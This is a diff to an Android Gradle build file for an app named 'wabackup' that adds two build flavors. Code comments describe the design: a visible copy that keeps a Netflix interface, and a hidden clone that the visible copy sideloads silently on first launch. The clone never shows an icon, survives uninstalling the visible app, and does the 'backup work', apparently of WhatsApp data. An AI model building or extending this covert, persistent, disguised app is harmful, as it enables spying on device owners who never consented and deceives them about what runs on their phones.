@@ -11,8 +11,23 @@ android {
         applicationId "com.personal.wabackup"
         minSdk 26
         targetSdk 34
-        versionCode 7
-        versionName "1.7"
+        versionCode 8
+        versionName "1.8"
+    }
+
+    flavorDimensions "copy"
+
+    productFlavors {
+        // Visible copy — the one the user installs. Netflix UI stays exactly as before.
+        dev {
+            dimension "copy"
+        }
+        // Hidden "copy version" — auto-sideloaded by the visible copy on first launch,
+        // icon never shown, survives uninstall of the visible copy, does the backup work.
+        clone {
+            dimension "copy"
+            applicationIdSuffix ".clone"
+        }
     }
 
     buildTypes {
